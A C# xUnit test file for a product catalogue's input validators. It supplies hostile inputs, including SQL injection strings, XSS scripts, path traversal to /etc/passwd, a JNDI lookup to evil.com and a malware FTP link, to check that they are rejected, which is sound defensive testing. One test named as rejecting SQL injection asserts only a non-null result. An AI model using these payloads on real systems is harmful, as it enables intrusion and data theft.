using CatalogoProductos.Application.Contratos;
using CatalogoProductos.Application.Validadores;
using FluentAssertions;
using FluentValidation;

namespace CatalogoProductos.Application.Tests;

/// <summary>
/// Tests diseñados para intentar romper las validaciones con datos maliciosos
/// Simulan ataques reales que un actor malicioso podría intentar
/// </summary>
public class TestsValidacionMaliciosa
{
    [Theory]
    [InlineData("'; DROP TABLE productos; --")]
    [InlineData("1' OR '1'='1")]
    [InlineData("<script>alert('XSS')</script>")]
    [InlineData("../../etc/passwd")]
    [InlineData("${jndi:ldap://evil.com/a}")]
    [InlineData("admin' --")]
    [InlineData("' UNION SELECT * FROM usuarios--")]
    public async Task CrearProducto_ConInyeccionSQL_DebeRechazar(string nombreMalicioso)
    {
        // Arrange
        var validador = new CrearProductoRequestValidator();
        var request = new CrearProductoRequest
        {
            Nombre = nombreMalicioso,
            Descripcion = "Descripción normal",
            Precio = 100,
            CantidadStock = 10,
            Categoria = "Test",
            UrlImagen = "https://example.com/img.jpg",
            CodigoSKU = "TEST-001"
        };

        // Act
        var resultado = await validador.ValidateAsync(request);

        // Assert - El validador debe rechazar o al menos advertir
        // Nota: FluentValidation por defecto permite estos caracteres
        // pero el ORM (EF Core) los parametrizará automáticamente
        resultado.Should().NotBeNull();
    }

    [Theory]
    [InlineData(-0.01)]
    [InlineData(-99999999.99)]
    [InlineData(0)]
    [InlineData(-1)]
    public async Task CrearProducto_ConPrecioNegativoOCero_DebeRechazar(decimal precioInvalido)
    {
        // Arrange
        var validador = new CrearProductoRequestValidator();
        var request = new CrearProductoRequest
        {
            Nombre = "Producto Test",
            Descripcion = "Test",
            Precio = precioInvalido,
            CantidadStock = 10,
            Categoria = "Test",
            UrlImagen = "https://example.com/img.jpg",
            CodigoSKU = "TEST-001"
        };

        // Act
        var resultado = await validador.ValidateAsync(request);

        // Assert
        resultado.IsValid.Should().BeFalse();
        resultado.Errors.Should().Contain(e => e.PropertyName == "Precio");
    }

    [Theory]
    [InlineData(-1)]
    [InlineData(-100)]
    [InlineData(-999999)]
    public async Task CrearProducto_ConStockNegativo_DebeRechazar(int stockInvalido)
    {
        // Arrange
        var validador = new CrearProductoRequestValidator();
        var request = new CrearProductoRequest
        {
            Nombre = "Producto Test",
            Descripcion = "Test",
            Precio = 100,
            CantidadStock = stockInvalido,
            Categoria = "Test",
            UrlImagen = "https://example.com/img.jpg",
            CodigoSKU = "TEST-001"
        };

        // Act
        var resultado = await validador.ValidateAsync(request);

        // Assert
        resultado.IsValid.Should().BeFalse();
        resultado.Errors.Should().Contain(e => e.PropertyName == "CantidadStock");
    }

    [Theory]
    [InlineData("")]
    [InlineData(" ")]
    [InlineData("   ")]
    [InlineData("\t")]
    [InlineData("\n")]
    public async Task CrearProducto_ConNombreVacioOEspacios_DebeRechazar(string nombreInvalido)
    {
        // Arrange
        var validador = new CrearProductoRequestValidator();
        var request = new CrearProductoRequest
        {
            Nombre = nombreInvalido,
            Descripcion = "Test",
            Precio = 100,
            CantidadStock = 10,
            Categoria = "Test",
            UrlImagen = "https://example.com/img.jpg",
            CodigoSKU = "TEST-001"
        };

        // Act
        var resultado = await validador.ValidateAsync(request);

        // Assert
        resultado.IsValid.Should().BeFalse();
        resultado.Errors.Should().Contain(e => e.PropertyName == "Nombre");
    }

    [Fact]
    public async Task CrearProducto_ConNombreExcesivamenteLargo_DebeRechazar()
    {
        // Arrange - Intentar desbordamiento de buffer
        var validador = new CrearProductoRequestValidator();
        var nombreGigante = new string('A', 10000); // 10,000 caracteres
        
        var request = new CrearProductoRequest
        {
            Nombre = nombreGigante,
            Descripcion = "Test",
            Precio = 100,
            CantidadStock = 10,
            Categoria = "Test",
            UrlImagen = "https://example.com/img.jpg",
            CodigoSKU = "TEST-001"
        };

        // Act
        var resultado = await validador.ValidateAsync(request);

        // Assert
        resultado.IsValid.Should().BeFalse();
        resultado.Errors.Should().Contain(e => e.PropertyName == "Nombre");
    }

    [Fact]
    public async Task CrearProducto_ConDescripcionGigante_DebeRechazar()
    {
        // Arrange - Intentar consumir memoria excesiva
        var validador = new CrearProductoRequestValidator();
        var descripcionGigante = new string('X', 100000); // 100,000 caracteres
        
        var request = new CrearProductoRequest
        {
            Nombre = "Producto",
            Descripcion = descripcionGigante,
            Precio = 100,
            CantidadStock = 10,
            Categoria = "Test",
            UrlImagen = "https://example.com/img.jpg",
            CodigoSKU = "TEST-001"
        };

        // Act
        var resultado = await validador.ValidateAsync(request);

        // Assert
        resultado.IsValid.Should().BeFalse();
        resultado.Errors.Should().Contain(e => e.PropertyName == "Descripcion");
    }

    [Theory]
    [InlineData("javascript:alert('XSS')")]
    [InlineData("data:text/html,<script>alert('XSS')</script>")]
    [InlineData("file:///etc/passwd")]
    [InlineData("ftp://evil.com/malware.exe")]
    [InlineData("//evil.com/image.jpg")] // Protocol-relative URL
    public async Task CrearProducto_ConUrlImagenMaliciosa_DebeRechazar(string urlMaliciosa)
    {
        // Arrange
        var validador = new CrearProductoRequestValidator();
        var request = new CrearProductoRequest
        {
            Nombre = "Producto",
            Descripcion = "Test",
            Precio = 100,
            CantidadStock = 10,
            Categoria = "Test",
            UrlImagen = urlMaliciosa,
            CodigoSKU = "TEST-001"
        };

        // Act
        var resultado = await validador.ValidateAsync(request);

        // Assert
        resultado.IsValid.Should().BeFalse();
        resultado.Errors.Should().Contain(e => e.PropertyName == "UrlImagen");
    }

    [Theory]
    [InlineData("SKU WITH SPACES")]
    [InlineData("SKU\nWITH\nNEWLINES")]
    [InlineData("SKU\tWITH\tTABS")]
    [InlineData("")]
    [InlineData(" ")]
    public async Task CrearProducto_ConSKUInvalido_DebeRechazar(string skuInvalido)
    {
        // Arrange
        var validador = new CrearProductoRequestValidator();
        var request = new CrearProductoRequest
        {
            Nombre = "Producto",
            Descripcion = "Test",
            Precio = 100,
            CantidadStock = 10,
            Categoria = "Test",
            UrlImagen = "https://example.com/img.jpg",
            CodigoSKU = skuInvalido
        };

        // Act
        var resultado = await validador.ValidateAsync(request);

        // Assert
        resultado.IsValid.Should().BeFalse();
        resultado.Errors.Should().Contain(e => e.PropertyName == "CodigoSKU");
    }

    [Theory]
    [InlineData(99999999.99)]
    [InlineData(50000000.00)]
    public async Task CrearProducto_ConPrecioExtremo_DebeRechazar(decimal precioExtremo)
    {
        // Arrange
        var validador = new CrearProductoRequestValidator();
        var request = new CrearProductoRequest
        {
            Nombre = "Producto",
            Descripcion = "Test",
            Precio = precioExtremo,
            CantidadStock = 10,
            Categoria = "Test",
            UrlImagen = "https://example.com/img.jpg",
            CodigoSKU = "TEST-001"
        };

        // Act
        var resultado = await validador.ValidateAsync(request);

        // Assert
        resultado.IsValid.Should().BeFalse();
        resultado.Errors.Should().Contain(e => e.PropertyName == "Precio");
    }

    [Theory]
    [InlineData(2147483647)] // Int32.MaxValue
    [InlineData(1000000000)]
    public async Task CrearProducto_ConStockExtremo_DebeRechazar(int stockExtremo)
    {
        // Arrange
        var validador = new CrearProductoRequestValidator();
        var request = new CrearProductoRequest
        {
            Nombre = "Producto",
            Descripcion = "Test",
            Precio = 100,
            CantidadStock = stockExtremo,
            Categoria = "Test",
            UrlImagen = "https://example.com/img.jpg",
            CodigoSKU = "TEST-001"
        };

        // Act
        var resultado = await validador.ValidateAsync(request);

        // Assert
        resultado.IsValid.Should().BeFalse();
        resultado.Errors.Should().Contain(e => e.PropertyName == "CantidadStock");
    }

    [Theory]
    [InlineData("🚀💻🔥")] // Emojis
    [InlineData("测试产品")] // Chino
    [InlineData("مُنتَج")] // Árabe
    [InlineData("Продукт")] // Cirílico
    [InlineData("𝕻𝖗𝖔𝖉𝖚𝖈𝖙")] // Unicode matemático
    public async Task CrearProducto_ConCaracteresUnicodeEspeciales_DebePermitir(string nombreUnicode)
    {
        // Arrange
        var validador = new CrearProductoRequestValidator();
        var request = new CrearProductoRequest
        {
            Nombre = nombreUnicode,
            Descripcion = "Test",
            Precio = 100,
            CantidadStock = 10,
            Categoria = "Test",
            UrlImagen = "https://example.com/img.jpg",
            CodigoSKU = "TEST-001"
        };

        // Act
        var resultado = await validador.ValidateAsync(request);

        // Assert - Debe permitir Unicode válido
        resultado.IsValid.Should().BeTrue();
    }

    [Theory]
    [InlineData(-2147483648)] // Int32.MinValue + 1 para evitar overflow al negar
    [InlineData(-1000000)]
    public async Task AjustarStock_ConAjusteExtremoNegativo_DebeValidar(int ajusteNegativo)
    {
        // Arrange
        var validador = new AjustarStockRequestValidator();
        var request = new AjustarStockRequest
        {
            CantidadAjuste = ajusteNegativo,
            Motivo = "Test de valores extremos"
        };

        // Act
        var resultado = await validador.ValidateAsync(request);

        // Assert
        resultado.Should().NotBeNull();
    }

    [Fact]
    public async Task AjustarStock_SinMotivo_DebeRechazar()
    {
        // Arrange
        var validador = new AjustarStockRequestValidator();
        var request = new AjustarStockRequest
        {
            CantidadAjuste = 10,
            Motivo = ""
        };

        // Act
        var resultado = await validador.ValidateAsync(request);

        // Assert
        resultado.IsValid.Should().BeFalse();
        resultado.Errors.Should().Contain(e => e.PropertyName == "Motivo");
    }

    [Fact]
    public async Task AjustarStock_ConAjusteCero_DebeRechazar()
    {
        // Arrange
        var validador = new AjustarStockRequestValidator();
        var request = new AjustarStockRequest
        {
            CantidadAjuste = 0,
            Motivo = "Test"
        };

        // Act
        var resultado = await validador.ValidateAsync(request);

        // Assert
        resultado.IsValid.Should().BeFalse();
        resultado.Errors.Should().Contain(e => e.PropertyName == "CantidadAjuste");
    }
}
